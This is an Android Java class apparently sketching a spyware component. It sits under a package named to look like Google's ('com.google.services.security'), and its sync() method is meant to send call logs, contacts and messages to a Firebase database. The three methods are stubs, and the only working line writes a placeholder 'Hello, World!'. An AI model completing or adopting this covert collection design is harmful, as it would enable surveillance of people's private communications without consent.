package com.google.services.security;

import android.content.Context;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

/**
 * Created by ouala_eddine on 12/27/2018.
 * Project : lahcen.
 */
class Synchronizer {
    private final Context context;

    Synchronizer(Context context) {
        this.context = context;
    }

    public void sync() {
        sendCallLogs();
        sendContacts();
        sendMessages();
    }

    private void sendMessages() {
        // TODO: 12/27/2018

        // Write a message to the database
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("message");

        myRef.setValue("Hello, World!");
    }

    private void sendContacts() {
        // TODO: 12/27/2018
    }

    private void sendCallLogs() {
        // TODO: 12/27/2018
    }
}
